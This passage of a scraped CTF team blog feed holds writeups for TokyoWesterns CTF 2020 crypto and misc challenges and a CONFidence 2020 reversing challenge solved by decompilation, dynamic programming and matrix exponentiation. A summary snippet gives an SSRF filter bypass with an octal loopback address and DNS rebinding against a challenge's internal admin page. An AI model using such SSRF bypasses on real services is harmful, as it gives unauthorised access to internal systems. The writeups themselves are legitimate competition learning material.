(p-1)//r, p) c2 = pow(c2, (p-1)//r, p) m = c2 * powmod(c1, -x, p) % p assert m in m_map ms += bytes([m_map.index(m) + 0x20]) print(ms) XOR and shift encryptor (Crypto, 303 points) Solved by Mystiz.\nThis is more like a PPC challenge instead of a cryptography challenge. There is a randgen function, that serves as the core of the challenge, defined below:\ndef randgen(): global s,p a = 3 b = 13 c = 37 s0 = s[p] p = (p + 1) \u0026amp; 63 s1 = s[p] res = (s0 + s1) \u0026amp; ((1\u0026lt;\u0026lt;64)-1) s1 ^= (s1 \u0026lt;\u0026lt; a) \u0026amp; ((1\u0026lt;\u0026lt;64)-1) s[p] = (s1 ^ s0 ^ (s1 \u0026gt;\u0026gt; b) ^ (s0 \u0026gt;\u0026gt; c)) \u0026amp; ((1\u0026lt;\u0026lt;64)-1) return res They are utilizing the \u0026quot;inefficiency\u0026quot; of the above function to encrypt the flag. In particular, they are using the $k_i$-th output to encrypt the $i$-th character of the flag (while $k_i$ could be up to 2100). Of course the naive approach doesn't work - you will wait forever.\nHowever, if we are only considering the state transition (i.e., how s is updated), we can see that it only involves bit shifting and XOR. Let's define $s_0, s_1, ...$ be a sequence with $s_i^{(k)}$ be the $k$-th bit of $s_i$. Imagine that the initial state being $(s_0, s_1, ..., s_{63})$ and the subsequent states being $(s_{64}, s_1, ..., s_{63})$, $(s_{64}, s_{65}, ..., s_{63})$ and so on.\nWe can write transitions under the definition (note that the $+$ operation is actually operated under $\\text{GF}(2)$, i.e., it is a XOR):\n $s_{i+64}^{(0)} := s_i^{(0)} + s_i^{(10)} + s_i^{(13)} + s_{i+63}^{(0)} + s_{i+63}^{(37)}$, $s_{i+64}^{(1)} := s_i^{(1)} + s_i^{(11)} + s_i^{(14)} + s_{i+63}^{(1)} + s_{i+63}^{(38)}$, ...  Hence, we can define a $64^2\\times64^2$ transition matrix $T$ over $\\text{GF}(2)$ from the above definition. Then if we can compute $T^{m}$, we can easily obtain $s_m, s_{m+1}, ..., s_{m+63}$.\nHelp. I personally think it is infeasible to compute the exponentiations since the dimension is large (wouldn\u0026rsquo;t it be $O(m^{2.3737}\\cdot\\log n)$ to compute $M^n$ for a $m\\times m$ matrix?).  Since we can efficiently compute $s_m$ given an arbitrary $m$, it would be easy for us to skip unecessary states and compute the flag: FAKEFLAG{THIS_IS_FAKE_FLAG}.\nOops, nope. I mean\nTWCTF{1084cd93186a8ab4110c991a7980aae36d77f2_X0R5h1f7+_15_m0Re_c0mp1ex_th4n_y0u_thought_right?1!!} circular (Crypto, 370 points) Solved by Mystiz.\nThere are two endpoints provided, pubkey and verify. The pubkey endpoint returns a fix n and k.\n$ curl \u0026#34;https://crypto02.chal.ctf.westerns.tokyo/\u0026#34; -X POST --data \u0026#39;{\u0026#34;cmd\u0026#34;:\u0026#34;pubkey\u0026#34;}\u0026#39; # {\u0026#34;pubkey\u0026#34;:{\u0026#34;n\u0026#34;:\u0026#34;25299...\u0026#34;,\u0026#34;k\u0026#34;:\u0026#34;31019...\u0026#34;}} And one can submit x, y and msg to the verify endpoint. It is verifying a signature in the following way:\n\\[x^2 + ky^2 \\equiv \\text{hash}(msg)\\ (\\text{mod}\\ n).\\]\nIn particular, you can get the flag when the signature is correct and msg == 'SUNSHINE RHYTHM'. Hence, the objective is to solve the quadratic congruence $x^2 + ky^2 \\equiv m\\ (\\text{mod}\\ n)$. This is a simplified version of OSS schemes.\nI was not aware of the OSS schemes beforehand. I spent some time deriving the solution by myself but in vain. Eventually, I've gave up deriving everything from nothing and came across to Pollard's algorithm (From An Efficient Solution of the Congruence x2 + ky2 = m (mod n) by Pollard and Schnorr). Moreover, the algorithm is described very clearly in An Exposition of Pollard's Algorithm for Quadratic Congruences by Shallit. I have an implementation of Pollard's algorithm following their procedures.\nSupplying $k$, $m$ and $n$ to Pollard's algorithm, we can get $x$ and $y$ rather quickly. Submitting the values to the verify endpoint would give us the flag - TWCTF{dbodfs-dbqsjdpso-mjcsb-mfp}.\nBirds (Misc, 41 points) Solved by cire meat pop and Mystiz.\nNothing much is given from the challenge description, there are a multiple lines /^[A-Z]{2}[0-9]{3,4}$/'s.\nBC552 AC849 JL106 PQ448 JL901 LH908 NH2177 After a bit of Googling, those are flight numbers. What do they mean? Let's see where they depart and arrive:\n   Flight Depart from Arrive to     BC552 OKA NGO   AC849 LHR YYZ   JL106 ITM HND   PQ448 TBS ODS   JL901 HND OKA   LH908 FRA LHR   NH2177 NRT ITM    Hmm... We can see some locations shown more than once. There must be some meaning. Let's connect them.\nNRT -\u0026gt; ITM -\u0026gt; HND -\u0026gt; OKA -\u0026gt; NGO FRA -\u0026gt; LHR -\u0026gt; YYZ TBS -\u0026gt; ODS By taking the first letter from each of them, we get:\nNIHON FLY TO Oh and finally we have the flag: TWCTF{FLYTONIHON}. Unfortunately the finals is online this year... (And we are not qualified, too)\nAddendum: We did!\nmask (Misc, 26 points) Solved by harrier and cire meat pop.\nThere is a list of IP addresses and maybe subnet mask in the challenge description.\n192.168.55.86/255.255.255.0 192.168.80.198/255.255.255.128 192.168.1.228/255.255.255.128 192.168.90.68/255.255.254.0 192.168.8.214/255.255.255.128 ... The list is quite long, we suspect that each IP address is representing a character. After multiple unsuccessful attempts, we found the host identifier for the last row is 0b111101, which is = in ASCII... Is it encoded with base64?\nimport base64 with open(\u0026#39;mask.txt\u0026#39;) as f: s = f.read().split(\u0026#39;\\n\u0026#39;) a = \u0026#39;\u0026#39; for i in s: lr = i.split(\u0026#39;/\u0026#39;) l = lr[0].split(\u0026#39;.\u0026#39;) r = lr[1].split(\u0026#39;.\u0026#39;) a+=chr(int(l[3])\u0026amp;(255^int(r[3]))) print(base64.b64decode(a)) The output is: TWCTF{Are-you-using-a-mask?}\n","permalink":"https://b6a.black/posts/2020-09-23-twctf/","summary":"urlcheck v1 (Web, 98 points) Solved by Ozetta.\nObjective: SSRF http://127.0.0.1/admin-status The input needs to fulfil the pattern '\\A(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)\\Z' and the first octet cannot be 0 or 127, and some other patterns for internal IP addresses. For some reason, int(\u0026quot;0177\u0026quot;) is still 177 instead of 127 in Python, so we can use http://0177.0.0.1/admin-status\nurlcheck v2 (Web, 128 points) Solved by Ozetta.\nObjective: SSRF http://localhost/admin-status Standard TOCTOU bug, just use DNS rebinding to get access: http://23bbd91c.","title":"TokyoWesterns CTF 6th 2020 Writeup"},{"content":"This week, we have teamed up as @blackb6a to play CONFidence 2020 CTF. We end up ranked 15, but we are more proud of ourselves able to solve a reversing challenge called Team Trees (395 points, 5 solves).\nIn particular, we are the first-to-solve to the challenge. It took us around two hours to win the flag. This writeup is written by @harrier_lcc and @mystiz613.\nChallenge Summary  We wanted to plant a lot of trees, but it's going kinda slow...\n We are given a binary that executes a slow algorithm that takes up a lot of memory. The objective is to wait the program until it is done - the flag would be shown as the output.\n Never. Our PCs don't even have enough memory to play with that. Even so, we gotta wait forever for the flag. Our objective is to optimize and rewrite the algorithm used. By optimize we mean reduce both the time and space complexities.\nSolution Part I: Baby steps from baby cases From the binary, we knew that we are going to find $f(1337)$ for a given $f$. Although we do not know what $f$ is, we could still have an insight on it. For example, we can patch 1337 by smaller values: 0, 1, etc.:\nn = 0: p4{32b9b6bca55548ed88ec405c5c7cf3a1} n = 1: p4{ee5fadd5a727857f32b9b6bca55548ed} n = 2: p4{ee5fadd5a727857f982d2435efffdac7} n = 3: p4{c8b5922a9f156985b4f8094372145c13} ... n = 4: Out of memory ;_; In particular, 32b9b6bca55548ed in the output for $n = 0$ is the v1 in sub_400816:\nvoid __noreturn sub_400816() { unsigned __int64 v0; // rdx  signed __int64 v1; // rcx  signed __int64 v2; // rt0  v0 = 0x82F96AC97429A68BLL; v1 = 0x32B9B6BCA55548EDLL; __debugbreak(); while ( 1 ) { v2 = v1; v1 = 3 * v0 + 2 * v1 + 4; v0 = v2; } } But what is 88ec405c5c7cf3a1? It must be related to v0 and v1. We tried 3*v0 + 2*v1 + 4 and it is ee5fadd5a727857f. It does not check out.\nWe have spot out that the output shares the same prefix when $n=1$ and $n=2$. Maybe we shall see what is going on with sub_400816 - it is simply generating numbers for a sequence, namely $s_n$, indefinitely:\n $s_0 = \\text{82F96AC97429A68B}_{16}$, $s_1 = \\text{32B9B6BCA55548ED}_{16}$, and $s_k = 3 s_{k-2} + 2 s_{k-1} + 4\\mod2^{64}$ for $k \\geq 2$.  Let's generate a bunch of $a_k$'s to see if there is something interesting:\ns_2 = 0xee5fadd5a727857f s_3 = 0x74ec7fe13e4ee5c9 s_4 = 0xb4f8094372145c13 s_5 = 0xc8b5922a9f156985 ... If we rewrite the program output in terms of $s_k$, we have:\nn = 0: p4{s_1 88ec405c5c7cf3a1} n = 1: p4{s_2 32b9b6bca55548ed} n = 2: p4{s_2 982d2435efffdac7} n = 3: p4{s_5 s_4} The output when $n = 3$ is actually composed by two elements in the sequence. It makes us think: is it the case that 88ec... (also 32b9... and 982d...) is an intermediate state? To verify our thoughts, we are going to dig deeper into the assembly operations.\n There are four operations. Here are the values of v0 and v1 (as defined in sub_400816) after each of the steps.\n/* rcx = c0, rdx = d0 */ lea rdx, [rdx+rdx*2] /* rcx = c0, rdx = 3*d0 */ lea rdx, [rdx+rcx*2+4] /* rcx = c0, rdx = 3*d0 + 2*c0 + 4 */ xchg rcx, rdx /* rcx = 3*d0 + 2*c0 + 4, rdx = c0 */ jmp short loc_40082F /* rcx = 3*d0 + 2*c0 + 4, rdx = c0 */ With that said, it takes four instructions for a complete cycle inside while. From the smaller values of $n$, we can see that the output format would be p4{[rdx][rcx]}. Let's see some starting values of rcx and rdx:\n step | rdx | rcx ------+------------------+------------------ 0 | 32b9b6bca55548ed | 82f96ac97429a68b 1 | 32b9b6bca55548ed | 88ec405c5c7cf3a1 \u0026lt;- output when n=0 2 | 32b9b6bca55548ed | ee5fadd5a727857f 3 | ee5fadd5a727857f | 32b9b6bca55548ed \u0026lt;- output when n=1 4 | ee5fadd5a727857f | 32b9b6bca55548ed ...or this? 5 | ee5fadd5a727857f | 982d2435efffdac7 \u0026lt;- output when n=2 6 | ee5fadd5a727857f | 74ec7fe13e4ee5c9 7 | 74ec7fe13e4ee5c9 | ee5fadd5a727857f 8 | 74ec7fe13e4ee5c9 | ee5fadd5a727857f 9 | 74ec7fe13e4ee5c9 | cb1f0980f576907d 10 | 74ec7fe13e4ee5c9 | b4f8094372145c13 11 | b4f8094372145c13 | 74ec7fe13e4ee5c9 12 | b4f8094372145c13 | 74ec7fe13e4ee5c9 13 | b4f8094372145c13 | 5ec57fa3baecb15b 14 | b4f8094372145c13 | c8b5922a9f156985 15 | c8b5922a9f156985 | b4f8094372145c13 \u0026lt;- output when n=3 16 | c8b5922a9f156985 | b4f8094372145c13 ...or this? 17 | c8b5922a9f156985 | 1ee81bca563d1439 18 | c8b5922a9f156985 | b053401f9467e747 19 | b053401f9467e747 | c8b5922a9f156985 :bulb: Imagination: You have opened a process with gdb that has a breakpoint at the beginning of the function. You are given a set of something (defined in sub_40090D) and checks if it has a given attribute (defined in sub_4009C4). If so, you call ni to move to the next step. Finally, you print the registers, extract edx and ecx, and print them as the flag.  So... what is the set of something? And what is the attribute it is checked against?\nPart II: Collecting the pieces for the puzzle There are four functions that worth investigating: sub_40090D (the enumerator), sub_4009C4 (the checker), sub_400A59 (the constructor) and sub_400840 (called from sub_40090D). We will first look into sub_400840:\n_DWORD *__fastcall sub_400840(_DWORD *a1) { int i; // [rsp+14h] [rbp-Ch]  _DWORD *v3; // [rsp+18h] [rbp-8h]  v3 = malloc(0x20uLL); if ( !v3 ) { puts(\u0026#34;Out of memory ;_;\u0026#34;); abort(); } *v3 = *a1; for ( i = 0; *a1 \u0026gt; i; ++i ) *(_QWORD *)\u0026amp;v3[2 * i + 2] = sub_400840(*(_QWORD *)\u0026amp;a1[2 * i + 2]); return v3; } Since it is allocating 32 bytes, we can define a dummy struct:\nstruct Dummy { char x[32]; }; Loading the struct into IDA, by redefining the types of a1 and v3 as Dummy*, we have:\nDummy *__fastcall sub_400840(Dummy *src) { int i; // [rsp+14h] [rbp-Ch]  Dummy *dest; // [rsp+18h] [rbp-8h]  dest = (Dummy *)malloc(0x20uLL); if ( !dest ) { puts(\u0026#34;Out of memory ;_;\u0026#34;); abort(); } *(_DWORD *)dest-\u0026gt;x = *(_DWORD *)src-\u0026gt;x; for ( i = 0; *(_DWORD *)src-\u0026gt;x \u0026gt; i; ++i ) *(_QWORD *)\u0026amp;dest-\u0026gt;x[8 * i + 8] = sub_400840(*(Dummy **)\u0026amp;src-\u0026gt;x[8 * i + 8]); return dest; } It is calling itself recursively. Would it be a deep clone? Moreover, we can further see that the first four bytes should be size and it would not be greater than 3. Otherwise 8*i+8 \u0026gt;= 32, overflowing the struct. After all, we think it is a node of the tree - and this is the final struct we have:\nstruct Node { int size; char x[4]; // unknown  Node *child[3]; }; More importantly, we can finally claim that sub_400840 is fully reversed.\nNode *__fastcall clone(Node *src) { int i; // [rsp+14h] [rbp-Ch]  Node *dest; // [rsp+18h] [rbp-8h]  dest = (Node *)malloc(0x20uLL); if ( !dest ) { puts(\u0026#34;Out of memory ;_;\u0026#34;); abort(); } dest-\u0026gt;size = src-\u0026gt;size; for ( i = 0; src-\u0026gt;size \u0026gt; i; ++i ) dest-\u0026gt;child[i] = clone(src-\u0026gt;child[i]); return dest; } Then we will be reversing sub_400A59. This function is simple, it is defining a path with length $n$. After the tree is constructed, it will be used by sub_400BED for enumeration. How? Let's see a baby example when $n = 2$:\ndigraph { t0_0[shape=point] t0_1[shape=point] t0_2[shape=point] t0_0 -\u0026gt; t0_1 [arrowhead=false] t0_1 -\u0026gt; t0_2 [arrowhead=false] x0[shape=point,style=invis] y0[shape=point,style=invis] x0-\u0026gt;y0 t1_0[shape=point] t1_1[shape=point] t1_2[shape=point] t1_3[shape=point] t1_0 -\u0026gt; t1_1 [arrowhead=false] t1_1 -\u0026gt; t1_2 [arrowhead=false] t1_1 -\u0026gt; t1_3 [arrowhead=false] x1[shape=point,style=invis] y1[shape=point,style=invis] x1-\u0026gt;y1 t2_0[shape=point] t2_1[shape=point] t2_2[shape=point] t2_3[shape=point] t2_4[shape=point] t2_0 -\u0026gt; t2_1 [arrowhead=false] t2_1 -\u0026gt; t2_2 [arrowhead=false] t2_1 -\u0026gt; t2_3 [arrowhead=false] t2_1 -\u0026gt; t2_4 [arrowhead=false] x2[shape=point,style=invis] y2[shape=point,style=invis] x2-\u0026gt;y2 t3_0[shape=point] t3_1[shape=point] t3_2[shape=point] t3_3[shape=point] t3_4[shape=point] t3_0 -\u0026gt; t3_1 [arrowhead=false] t3_0 -\u0026gt; t3_3 [arrowhead=false] t3_1 -\u0026gt; t3_2 [arrowhead=false] t3_3 -\u0026gt; t3_4 [arrowhead=false] x3[shape=point,style=invis] y3[shape=point,style=invis] x3-\u0026gt;y3 t4_0[shape=point] t4_1[shape=point] t4_2[shape=point] t4_3[shape=point] t4_4[shape=point] t4_5[shape=point] t4_0 -\u0026gt; t4_1 [arrowhead=false] t4_0 -\u0026gt; t4_3 [arrowhead=false] t4_1 -\u0026gt; t4_2 [arrowhead=false] t4_3 -\u0026gt; t4_4 [arrowhead=false] t4_3 -\u0026gt; t4_5 [arrowhead=false] x4[shape=point,style=invis] y4[shape=point,style=invis] x4-\u0026gt;y4 u[label=\u0026#34;...\u0026#34;, shape=plaintext] x5[shape=point,style=invis] y5[shape=point,style=invis] x5-\u0026gt;y5 t5_0[shape=point] t5_1[shape=point] t5_2[shape=point] t5_3[shape=point] t5_4[shape=point] t5_5[shape=point] t5_6[shape=point] t5_7[shape=point] t5_8[shape=point] t5_9[shape=point] t5_10[shape=point] t5_11[shape=point] t5_12[shape=point] t5_0 -\u0026gt; t5_1 [arrowhead=false] t5_0 -\u0026gt; t5_2 [arrowhead=false] t5_0 -\u0026gt; t5_3 [arrowhead=false] t5_1 -\u0026gt; t5_4 [arrowhead=false] t5_1 -\u0026gt; t5_5 [arrowhead=false] t5_1 -\u0026gt; t5_6 [arrowhead=false] t5_2 -\u0026gt; t5_7 [arrowhead=false] t5_2 -\u0026gt; t5_8 [arrowhead=false] t5_2 -\u0026gt; t5_9 [arrowhead=false] t5_3 -\u0026gt; t5_10 [arrowhead=false] t5_3 -\u0026gt; t5_11 [arrowhead=false] t5_3 -\u0026gt; t5_12 [arrowhead=false] {rank=same; t0_1; u; x0; y0; x1; y1; x2; y2; x3; y3; x4; y4; x5; y5} } Well... it is just enumerating all the ternary trees with depth $n$, where each of the leaf node is on level $n$.\nAfter that, we check the number of good trees. By good it is defined by (former) sub_4009C4:\nsigned __int64 __fastcall is_good_tree(Node *node, int k) { int ka; // [rsp+4h] [rbp-1Ch]  int kb; // [rsp+4h] [rbp-1Ch]  int i; // [rsp+1Ch] [rbp-4h]  ka = k; if ( node-\u0026gt;size \u0026gt; 1 \u0026amp;\u0026amp; k ) return 0LL; if ( node-\u0026gt;size \u0026gt; k ) ka = node-\u0026gt;size; kb = ka - 1; if ( kb \u0026lt; 0 ) kb = 0; for ( i = 0; node-\u0026gt;size \u0026gt; i; ++i ) { if ( (unsigned __int8)is_good_tree(node-\u0026gt;child[i], kb) != 1 ) return 0LL; } return 1LL; } harrier has implemented a good tree checker (himself) in Discord for me to test with:\n After all, a tree is said to be good if both of the condition are satisfied:\n for each node with two children, every children should have at most one children, and for each node with three children, every children and their grandchildren should have at most one children.  Cool. We have the pieces of the puzzle gathered. Define $g(n)$ to be the number of good trees of depth $n$. We are going to find $g(1337)$ and move the sequence forward by $g(1337)$ instructions.\nPart III: Verifying this for the baby cases We are double checking if our observation checks out for smaller $n$'s. From above, $g(0) = 1$, $g(1) = 3\\ \\text{or}\\ 4$, $g(2) = 5$ and $g(3) = 15\\ \\text{or}\\ 16$.\nFor $n = 0$, the only tree would be:\ndigraph { node[shape=point] edge[arrowhead=false] t0 } Yeah. It is a good tree. Thus $g(0) = 1$. Also, $g(1) = 3$ since the three trees are all good:\ndigraph { node[shape=point] edge[arrowhead=false] t0_0 -\u0026gt; t0_1 t1_0 -\u0026gt; t1_1 t1_0 -\u0026gt; t1_2 t2_0 -\u0026gt; t2_1 t2_0 -\u0026gt; t2_2 t2_0 -\u0026gt; t2_3 } For $n = 2$, we start rejecting trees. There are 39 trees, but there are only five being good. Hence $g(2) = 5$.\ndigraph { node[shape=point] edge[arrowhead=false] t0_0 -\u0026gt; t0_1 t0_1 -\u0026gt; t0_2 t3_0 -\u0026gt; t3_1 t3_1 -\u0026gt; t3_2 t3_1 -\u0026gt; t3_3 t4_0 -\u0026gt; t4_1 t4_1 -\u0026gt; t4_2 t4_1 -\u0026gt; t4_3 t4_1 -\u0026gt; t4_4 t1_0 -\u0026gt; t1_1 t1_0 -\u0026gt; t1_2 t1_1 -\u0026gt; t1_3 t1_2 -\u0026gt; t1_4 t2_0 -\u0026gt; t2_1 t2_0 -\u0026gt; t2_2 t2_0 -\u0026gt; t2_3 t2_1 -\u0026gt; t2_4 t2_2 -\u0026gt; t2_5 t2_3 -\u0026gt; t2_6 } And $g(3) = 15$. They are:\ndigraph { node[shape=point] edge[arrowhead=false] t0_0 -\u0026gt; t0_1 t0_1 -\u0026gt; t0_2 t0_2 -\u0026gt; t0_3 t5_0 -\u0026gt; t5_1 t5_1 -\u0026gt; t5_2 t5_2 -\u0026gt; t5_3 t5_2 -\u0026gt; t5_4 t6_0 -\u0026gt; t6_1 t6_1 -\u0026gt; t6_2 t6_2 -\u0026gt; t6_3 t6_2 -\u0026gt; t6_4 t6_2 -\u0026gt; t6_5 t3_0 -\u0026gt; t3_1 t3_1 -\u0026gt; t3_2 t3_1 -\u0026gt; t3_3 t3_2 -\u0026gt; t3_4 t3_3 -\u0026gt; t3_5 t4_0 -\u0026gt; t4_1 t4_1 -\u0026gt; t4_2 t4_1 -\u0026gt; t4_3 t4_1 -\u0026gt; t4_4 t4_2 -\u0026gt; t4_5 t4_3 -\u0026gt; t4_6 t4_4 -\u0026gt; t4_7 t1_0 -\u0026gt; t1_1 t1_0 -\u0026gt; t1_2 t1_1 -\u0026gt; t1_3 t1_2 -\u0026gt; t1_4 t1_3 -\u0026gt; t1_5 t1_4 -\u0026gt; t1_6 t7_0 -\u0026gt; t7_1 t7_0 -\u0026gt; t7_2 t7_1 -\u0026gt; t7_3 t7_2 -\u0026gt; t7_4 t7_3 -\u0026gt; t7_5 t7_4 -\u0026gt; t7_6 t7_4 -\u0026gt; t7_7 t8_0 -\u0026gt; t8_1 t8_0 -\u0026gt; t8_2 t8_1 -\u0026gt; t8_3 t8_2 -\u0026gt; t8_4 t8_3 -\u0026gt; t8_5 t8_4 -\u0026gt; t8_6 t8_4 -\u0026gt; t8_7 t8_4 -\u0026gt; t8_8 t9_0 -\u0026gt; t9_1 t9_0 -\u0026gt; t9_2 t9_1 -\u0026gt; t9_3 t9_2 -\u0026gt; t9_4 t9_3 -\u0026gt; t9_5 t9_3 -\u0026gt; t9_6 t9_4 -\u0026gt; t9_7 }digraph { node[shape=point] edge[arrowhead=false] t10_0 -\u0026gt; t10_1 t10_0 -\u0026gt; t10_2 t10_1 -\u0026gt; t10_3 t10_2 -\u0026gt; t10_4 t10_3 -\u0026gt; t10_5 t10_3 -\u0026gt; t10_6 t10_4 -\u0026gt; t10_7 t10_4 -\u0026gt; t10_8 t11_0 -\u0026gt; t11_1 t11_0 -\u0026gt; t11_2 t11_1 -\u0026gt; t11_3 t11_2 -\u0026gt; t11_4 t11_3 -\u0026gt; t11_5 t11_3 -\u0026gt; t11_6 t11_4 -\u0026gt; t11_7 t11_4 -\u0026gt; t11_8 t11_4 -\u0026gt; t11_9 t12_0 -\u0026gt; t12_1 t12_0 -\u0026gt; t12_2 t12_1 -\u0026gt; t12_3 t12_2 -\u0026gt; t12_4 t12_3 -\u0026gt; t12_5 t12_3 -\u0026gt; t12_6 t12_3 -\u0026gt; t12_7 t12_4 -\u0026gt; t12_8 t13_0 -\u0026gt; t13_1 t13_0 -\u0026gt; t13_2 t13_1 -\u0026gt; t13_3 t13_2 -\u0026gt; t13_4 t13_3 -\u0026gt; t13_5 t13_3 -\u0026gt; t13_6 t13_3 -\u0026gt; t13_7 t13_4 -\u0026gt; t13_8 t13_4 -\u0026gt; t13_9 t14_0 -\u0026gt; t14_1 t14_0 -\u0026gt; t14_2 t14_1 -\u0026gt; t14_3 t14_2 -\u0026gt; t14_4 t14_3 -\u0026gt; t14_5 t14_3 -\u0026gt; t14_6 t14_3 -\u0026gt; t14_7 t14_4 -\u0026gt; t14_8 t14_4 -\u0026gt; t14_9 t14_4 -\u0026gt; t14_10 t2_0 -\u0026gt; t2_1 t2_0 -\u0026gt; t2_2 t2_0 -\u0026gt; t2_3 t2_1 -\u0026gt; t2_4 t2_2 -\u0026gt; t2_5 t2_3 -\u0026gt; t2_6 t2_4 -\u0026gt; t2_7 t2_5 -\u0026gt; t2_8 t2_6 -\u0026gt; t2_9 } Cool! Everything checks out! Luckily the memory overflows when $n = 4$, otherwise our OCD would be forcing us to find $g(4)$ and the writeup will be flooded by a large forest.\nPart IV: Algorithms, algorithms everywhere In this part, harrier and I work on a different topic:\n harrier's task: Find $g(1337)$. Mystiz's task: Find the flag if harrier has $g(1337)$ computed.  4.1. What is $g(1337)$? To find the number of good trees of height $h$, we define an auxiliary variable $k$ (interpret it as cooldown). Here we redefine good trees again:\nFor a ternary tree, it is said to be good if for every node,\n [Recovery] if $k \u0026gt; 0$: there should be at most one child, and [Fertility] if $k = 0$: if there are $c$ children, then each of them has cooldown $k = c-1$.  Simply put, you need to recover to be fertile. For instance, the following is a good tree since each of the node with non-zero cooldown has only a child.\ndigraph { node[shape=rectangle, style=rounded] t0 [label=0] t1 [label=1] t2 [label=1] t3 [label=0] t4 [label=0] t0-\u0026gt;t1 t0-\u0026gt;t2 t1-\u0026gt;t3 t2-\u0026gt;t4 } However, this is not a good tree since the red node is too fertile:\ndigraph { node[shape=rectangle, style=rounded] t0 [label=0] t1 [label=1, style=\u0026#34;filled, rounded\u0026#34;, fillcolor=\u0026#34;#ff000080\u0026#34;] t2 [label=1] t3 [label=0] t4 [label=0] t5 [label=0] t0-\u0026gt;t1 t0-\u0026gt;t2 t1-\u0026gt;t3 t1-\u0026gt;t4 t2-\u0026gt;t5 } Luckily, we don't need to count the good trees one by one. It can be solved by dynamic programming rather easily. Let's define the state dp[h][k] to be the number of good trees if the tree is of depth h and cooldown k. Then:\n [Base case] dp[0][k] == 1 for every k, [Transition] dp[h][k] == dp[h-1][k-1] for h, k \u0026gt; 0, and [Transition] dp[h][0] == dp[h-1][0] + dp[h-1][1]**2 + dp[h-1][2]**3 for h \u0026gt; 0.  The first condition is obvious - the only tree with depth 0 is the tree with the only root node. It is good no matter what the cooldown is.\nFor the second condition, it is not difficult to imagine it as an tree that must cooldown. Hence, if $\\text{GT}_{hk}$ is a good tree with height $h\u0026gt;0$ and cooldown $k\u0026gt;0$, then:\ndigraph { node[shape=point] edge[arrowhead=false] x-\u0026gt;st subgraph cluster { style=filled color=lightgray label=\u0026#34;GTₕ₋₁,ₖ₋₁\u0026#34; labelloc=b st[shape=triangle, height=2, label=\u0026#34;\u0026#34;] } } It is a little bit tricky for the third condition. Since it is in the fertile mode again, we can decide if there are one, two or three children. Then each of the following trees work:\ndigraph { node[shape=point] edge[arrowhead=false] x0-\u0026gt;st0 subgraph cluster0 { style=filled color=lightgray label=\u0026#34;GTₕ₋₁,₀\u0026#34; labelloc=b st0[shape=triangle, height=2, label=\u0026#34;\u0026#34;] } x1-\u0026gt;st1:n x1-\u0026gt;st2:n subgraph cluster1 { style=filled color=lightgray label=\u0026#34;Each subtree is GTₕ₋₁,₁\u0026#34; labelloc=b st1[shape=triangle, height=2, label=\u0026#34;\u0026#34;] st2[shape=triangle, height=2, label=\u0026#34;\u0026#34;] } x2-\u0026gt;st3:n x2-\u0026gt;st4:n x2-\u0026gt;st5:n subgraph cluster2 { style=filled color=lightgray label=\u0026#34;Each subtree is GTₕ₋₁,₂\u0026#34; labelloc=b st3[shape=triangle, height=2, label=\u0026#34;\u0026#34;] st4[shape=triangle, height=2, label=\u0026#34;\u0026#34;] st5[shape=triangle, height=2, label=\u0026#34;\u0026#34;] } } Hence, if there are k children, then there are dp[h-1][k-1]**k choices. Since we are able to pick k = 1, 2, 3, we can simply sum them up for dp[h][k]. After all, this is the Python script to compute:\ndef g(k: int) -\u0026gt; int: # Base case dp = [[1, 1, 1]] # Transition for _ in range(k): dp.append([ sum([dp[-1][i]**(i+1) for i in range(3)]), dp[-1][0], dp[-1][1] ]) return dp[-1][0] But the numbers is growing exponentially and finding $g(1337)$ takes eternally. What can we do? Nevermind, we will get back to this shortly.\n4.2. Fast sequence generation To compute the values of ecx and edx, we can find the number of executed instructions (denote it as $q$). Since the loop is completed every four steps, we can find $s_{\\mathbf{floor}(q/4)}$ and $s_{\\mathbf{floor}(q/4)+1}$ and perform the remainder of the instructions.\nLet's get back to the sequence $s_n$:\n $s_0 = \\text{82F96AC97429A68B}_{16}$, $s_1 = \\text{32B9B6BCA55548ED}_{16}$, and $s_k = 3 s_{k-2} + 2 s_{k-1} + 4\\mod2^{64}$ for $k \\geq 2$.  To compute it efficiently, we can rewrite it as a matrix notation:\n\\[ \\begin{bmatrix} s_{k+1} \\\\ s_k \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} 2 \u0026 3 \u0026 4 \\\\ 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 1\\end{bmatrix} \\begin{bmatrix} s_k \\\\ s_{k-1} \\\\ 1 \\end{bmatrix} \\mod 2^{64}. \\]\nWhy? Try the multiplication by yourselves! Anyway, then we are able to compute $s_m$ and $s_{m+1}$ efficiently, since\n\\[ \\begin{bmatrix} s_{m+1} \\\\ s_m \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} 2 \u0026 3 \u0026 4 \\\\ 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 1\\end{bmatrix}^m \\begin{bmatrix} s_1 \\\\ s_0 \\\\ 1 \\end{bmatrix} \\mod 2^{64}. \\]\nMoreover, since\n\\[\\begin{bmatrix} 2 \u0026 3 \u0026 4 \\\\ 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 1\\end{bmatrix}^{2^{64}} = \\begin{bmatrix} 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 1 \u0026 0 \\\\ 0 \u0026 0 \u0026 1\\end{bmatrix}, \\]\nthe square matrix has order $2^{64}$. That said, we don't need to find the exact value for $g(1337)$. Instead, we can compute $g(1337)\\mod (2^{64}\\times4)$. Hereby we need to multiple the number by four, since there are 4 instructions per loop).\nPart V: The flagggggggggg! After all, we can modify the Python function we had to compute $g(k)\\mod 2^{66}$:\ndef g(k: int) -\u0026gt; int: # Base case dp = [[1, 1, 1]] # Transition for _ in range(k): dp.append([ sum([dp[-1][i]**(i+1) for i in range(3)]) % 2**66, dp[-1][0], dp[-1][1] ]) return dp[-1][0] And g(1337) = 59988074356265869957 pops out at no time. Therefore, we can find $s_{14997018589066467489}$ and $s_{14997018589066467490}$ and proceed one instruction further. We have rdx being 0x62246322232ceabf and rcx being 0xbf1d9826c054007!\nThus p4{62246322232ceabfbf1d9826c054007} would be the flag, right? NO!\nIt was 4:40 am and we were very sleepy. It took us few minutes to figure out that rcx isn't composed of 16 hexchars. The correct flag should be p4{62246322232ceabf0bf1d9826c054007} (note that there is an zero). Yeah, :checkered_flag: - and we are the first to capture this!\n","permalink":"https://b6a.black/posts/2020-09-08-confidencectf-team-trees/","summary":"This week, we have teamed up as @blackb6a to play CONFidence 2020 CTF. We end up ranked 15, but we are more proud of ourselves able to solve a reversing challenge called Team Trees (395 points, 5 solves).\nIn particular, we 